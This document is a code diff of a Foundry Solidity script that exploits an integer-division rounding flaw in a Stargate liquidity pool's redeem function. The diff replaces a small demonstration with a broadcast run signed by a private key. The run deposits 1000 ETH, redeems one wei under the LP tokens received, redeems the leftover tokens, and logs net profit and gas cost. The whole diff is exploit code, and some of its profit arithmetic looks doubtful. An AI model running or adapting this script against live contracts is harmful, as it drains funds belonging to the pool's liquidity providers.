@@ -7,7 +7,6 @@ import "forge-std/console.sol";
 interface IERC20 {
     function approve(address spender, uint256 amount) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
-    function transfer(address recipient, uint256 amount) external returns (bool);
 }
 
 interface IStargatePool {
@@ -15,7 +14,6 @@ interface IStargatePool {
     function redeem(uint256 _amountLD, address _receiver) external returns (uint256);
     function lpToken() external view returns (address);
     function sharedDecimals() external view returns (uint8);
-    function token() external view returns (address);
 }
 
 contract StargateIntegerDivisionTest is Script {
@@ -26,56 +24,66 @@ contract StargateIntegerDivisionTest is Script {
         address deployer = vm.addr(privateKey);
         vm.startBroadcast(privateKey);
 
-        // Setup interfaces
+        // Setup
         IStargatePool stargatePool = IStargatePool(STARGATE_POOL);
         IERC20 lpToken = IERC20(stargatePool.lpToken());
+
+        // Record starting state
+        uint256 initialETH = address(deployer).balance;
+        console.log("Initial ETH balance:", initialETH);
 
         // Calculate convert rate
         uint8 sharedDecimals = stargatePool.sharedDecimals();
         uint256 convertRate = 10**(18 - sharedDecimals); // 10^12
         console.log("Convert rate:", convertRate);
 
-        // IMPORTANT: Use an amount that's a clean multiple of convertRate
-        // This makes the vulnerability easier to demonstrate
-        uint256 depositAmount = 5 * convertRate; // 5 * 10^12 = 5,000,000,000,000 wei (0.000005 ETH)
-        console.log("Deposit amount:", depositAmount, "wei");
+        // STEP 1: DEPOSIT ETH
+        uint256 depositAmount = 1000 ether; // 1000 ETH Deposit
+        console.log("Deposit amount:", depositAmount);
+        uint256 gasUsedDeposit = gasleft(); // Gas before
 
-        // Deposit ETH directly
-        uint256 initialBalance = address(this).balance;
         uint256 lpReceived = stargatePool.deposit{value: depositAmount}(deployer, depositAmount);
         console.log("LP tokens received:", lpReceived);
+        gasUsedDeposit = gasUsedDeposit - gasleft(); // Gas after
 
-        // Check LP balance of the deployer (not the contract)
-        uint256 lpBalance = lpToken.balanceOf(deployer);
-        console.log("LP balance:", lpBalance);
-
-        // Create the exploit amount: N*10^12 - 1
-        uint256 redemptionAmount = depositAmount - 1; // 5*10^12 - 1
+        // STEP 2: EXECUTE EXPLOIT REDEMPTION
+        uint256 redemptionAmount = lpReceived - 1; // One wei under received amount
         console.log("Redemption amount:", redemptionAmount);
 
-        // Approve LP tokens
         lpToken.approve(STARGATE_POOL, redemptionAmount);
+        uint256 gasUsedRedeem = gasleft(); // Gas before
+        uint256 ethReceived1 = stargatePool.redeem(redemptionAmount, deployer);
+        console.log("First redemption received:", ethReceived1);
+        gasUsedRedeem = gasUsedRedeem - gasleft();
 
-        // Redeem and observe the behavior
-        try stargatePool.redeem(redemptionAmount, deployer) returns (uint256 received) {
-            console.log("Redemption successful! Received:", received);
+        // STEP 3: CHECK REMAINING LP TOKENS
+        uint256 remainingLP = lpToken.balanceOf(deployer);
+        console.log("Remaining LP tokens:", remainingLP);
 
-            // Check remaining LP balance - should be close to convertRate
-            uint256 remainingLP = lpToken.balanceOf(deployer);
-            console.log("Remaining LP tokens:", remainingLP);
+        // STEP 4: REDEEM REMAINING LP TOKENS
+        lpToken.approve(STARGATE_POOL, remainingLP);
+        uint256 gasUsedRedeem2 = gasleft();
+        uint256 ethReceived2 = stargatePool.redeem(remainingLP, deployer);
+        console.log("Second redemption received:", ethReceived2);
+        gasUsedRedeem2 = gasUsedRedeem2 - gasleft();
 
-            // The exploit was successful if remainingLP > (lpBalance - redemptionAmount)
-            // The difference should be close to convertRate - 1
-            console.log("Expected unburned tokens:", depositAmount - redemptionAmount);
-            console.log("Actual unburned tokens:", remainingLP);
-            console.log("Extra tokens kept:", remainingLP - (lpBalance - redemptionAmount));
-        } catch Error(string memory reason) {
-            console.log("Redemption failed with reason:", reason);
+        vm.stopBroadcast(); // Stop broadcast *before* final balance check
 
-            // Even with failure, we've demonstrated the vulnerability
-            // The trace shows the contract trying to burn fewer tokens than requested
-        }
+        // STEP 5: CHECK FINAL BALANCE *AFTER* BROADCAST
+        uint256 finalETH = address(deployer).balance;
+        console.log("Final ETH balance:", finalETH);
 
-        vm.stopBroadcast();
+
+        // STEP 6: PROFIT ANALYSIS (Accurate Calculation)
+        // Net Profit =  Final Balance - (Initial Balance - Deposit Amount)
+        int256 netProfit = int256(finalETH) - (int256(initialETH) - int256(depositAmount));
+        console.log("Net profit (wei):", netProfit);
+
+        //Informational:
+        uint256 totalGasUsed = gasUsedDeposit + gasUsedRedeem + gasUsedRedeem2;
+        console.log("Total gas used:", totalGasUsed);
+        console.log("Profit before gas (wei):", ethReceived2 - 1);
+        console.log("Gas price:", tx.gasprice); //Gets the gas price AFTER the broadcast
+        console.log("Gas cost:", tx.gasprice * totalGasUsed);
     }
 }
